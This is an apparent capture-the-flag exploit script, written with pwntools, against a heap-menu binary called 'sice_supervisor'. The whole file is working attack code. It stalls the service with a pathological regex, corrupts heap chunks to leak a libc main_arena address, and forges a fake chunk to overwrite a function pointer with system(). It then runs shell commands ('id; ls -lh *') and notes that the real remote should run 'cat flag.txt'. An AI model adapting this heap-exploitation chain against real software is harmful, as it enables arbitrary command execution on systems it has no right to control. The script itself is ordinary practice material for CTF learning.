from pwn import *


PROMPT = b'> '
DONE = b'Done!\n'
EVIL_RE = b'(?:){2000000000}'


if __name__ == '__main__':
    with process('./sice_supervisor') as tube:
    #with remote('mc.ax', 30283) as tube:
        # deploy
        tube.sendlineafter(PROMPT, b'1')

        def sice(payload, wait_prompt=True):
            if wait_prompt:
                tube.sendlineafter(PROMPT, b'2')
            else:
                tube.sendline(b'2')
            tube.sendlineafter(PROMPT, b'0')
            tube.sendafter(PROMPT, payload)

        def multi_payload(cnt, newline=False):
            for idx in range(cnt):
                payload = b'\xFF' * 1000
                if idx + 1 == cnt:
                    payload = payload[:-1]
                    if newline:
                        payload += b'\n'
                sice(payload)

        def add_evil_deet(deet_idx):
            sice(flat(
                b'1\n',               # add deet
                b'100000\n',          # size
                b'3\n',               # edit deet
                str(deet_idx).encode() + b'\n',
            ))

            # send slow payload
            tube.sendlineafter(PROMPT, b'3')
            tube.sendlineafter(PROMPT, b'0')
            tube.sendlineafter(PROMPT, EVIL_RE)

            # edit payload
            multi_payload(100)
        pause()

        add_evil_deet(0)
        add_evil_deet(1)

        sice(flat(
            b'4\n',   # view deet
            b'1\n',   # deet idx
        ))

        sice(flat(
            b'4\n',   # view deet
            b'0\n',   # deet idx
            b'3\n',   # edit deet
            b'0\n',   # deet idx
            b'lol\n', # edit payload
            b'2\n',   # remove deet
            b'0\n',   # deet idx
            b'1\n',   # add deet
            b'10000\n', # size
            b'2\n',   # remove deet
            b'1\n',   # deet idx
        ))

        for done_idx in range(5):
            tube.readuntil(DONE)
            log.info('DONE #%d', done_idx)

        sice(flat(
            b'1\n',
            f'{0xffffffffffffcdc8}\n'.encode(),
            b'1\n',
            f'{0x70}\n'.encode(),
            b'1\n',
            f'{0x868 - 0x70 - 0x10}\n'.encode(),
            b'1\n',
            b'16\n',

            b'3\n',
            b'4\n',
            b'A' * 16 + b'\n',

            b'4\n',
            b'4\n',
        ), wait_prompt=False)
        tube.recvuntil(b'A' * 16)
        main_arena = unpack(tube.recv(6), 'all')
        fake_chunk = main_arena + 0x1c85
        system_addr = main_arena - 0x39c820

        sice(flat(
            b'3\n',
            b'2\n',
            p64(0) * 2,

            p32(0),
            p32(2),

            p64(1),
            p64(0) * 5,
            p64(fake_chunk),
            b'\n',
        ), wait_prompt=False)

        sice(flat(
            b'3\n',
            b'0\n',
        ))
        multi_payload(10, newline=True)

        for _ in range(2):
            tube.sendlineafter(PROMPT, b'3')
            tube.sendlineafter(PROMPT, b'0')
            tube.sendlineafter(PROMPT, EVIL_RE)

            sice(flat(
                b'4\n',
                b'0\n',
            ))

        sice(flat(
            b'1\n',
            f'{0x68}\n'.encode(),
        ))

        for done_idx in range(3):
            tube.readuntil(DONE)
            log.info('DONE #%d', done_idx)

        sice(flat(
            b'3\n',
            b'5\n',
            b'\x00' * 0x13,
            p64(system_addr),
            b'\n',

            b'3\n',
            b'0\n',
            b'id; ls -lh *\n', # use cat flag.txt on the real remote

            b'2\n',
            b'0\n',
        ), wait_prompt=False)

        tube.recvall()
